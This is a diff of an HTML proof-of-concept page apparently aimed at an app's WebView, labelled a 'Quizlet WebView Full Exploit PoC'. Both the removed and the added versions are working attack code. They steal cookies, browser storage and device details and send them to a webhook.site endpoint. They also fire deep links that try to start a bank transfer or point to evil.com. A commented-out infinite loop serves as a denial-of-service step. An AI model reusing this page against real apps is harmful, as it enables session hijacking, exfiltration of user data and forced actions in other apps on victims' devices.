@@ -1,64 +1,20 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>WebView Exploit Test</title>
-  <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
-    h1 { color: #f33; }
-    pre { white-space: pre-wrap; word-wrap: break-word; background: #222; padding: 10px; border: 1px solid #333; }
-  </style>
-</head>
-<body>
-  <h1>🔥 WebView Exploit Test 🔥</h1>
-  <p>Collected Data:</p>
-  <pre id="output">Loading...</pre>
+  <body>
+    <h1>Quizlet WebView Full Exploit PoC</h1>
+    <script>
+      // 1. Steal cookies/session
+      fetch('https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/steal?c=' + encodeURIComponent(document.cookie));
 
-  <script>
-    // 🕵️‍♂️ جمع البيانات
-    const data = {
-      domain: document.domain,
-      cookies: document.cookie,
-      localStorage: {},
-      sessionStorage: {},
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      languages: navigator.languages,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory || "N/A",
-      time: new Date().toISOString(),
-    };
+      // 2. Fingerprint device
+      fetch('https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/fp?ua=' + encodeURIComponent(navigator.userAgent));
 
-    // استخراج التخزين المحلي
-    for (let i = 0; i < localStorage.length; i++) {
-      const key = localStorage.key(i);
-      data.localStorage[key] = localStorage.getItem(key);
-    }
+      // 3. Trigger deep link to open another app (e.g., banking app, Play Store)
+      setTimeout(function() {
+        location.href = 'deeplink://com.bank.app/transfer?amount=1000';
+      }, 2000);
 
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const key = sessionStorage.key(i);
-      data.sessionStorage[key] = sessionStorage.getItem(key);
-    }
-
-    // 📺 عرض البيانات على الصفحة
-    document.getElementById("output").textContent = JSON.stringify(data, null, 2);
-
-    // 🌐 إرسالها إلى Webhook
-    fetch("https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
-    }).catch(() => {});
-
-    // 🧪 محاولة فتح deeplink بعد 3 ثواني
-    setTimeout(() => {
-      location.href = "deeplink://com.bank.app/transfer?amount=9999";
-    }, 3000);
-
-    // 🧪 تجربة DeepLink+ بعد 6 ثواني
-    setTimeout(() => {
-      location.href = "deeplink+://navigate?primaryUrl=https://evil.com&primaryTrackingUrl=https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706";
-    }, 6000);
-  </script>
-
-</body>
+      // 4. Crash the app (DoS)
+      // setTimeout(function() { while(1){} }, 5000);
+    </script>
+  </body>
 </html>
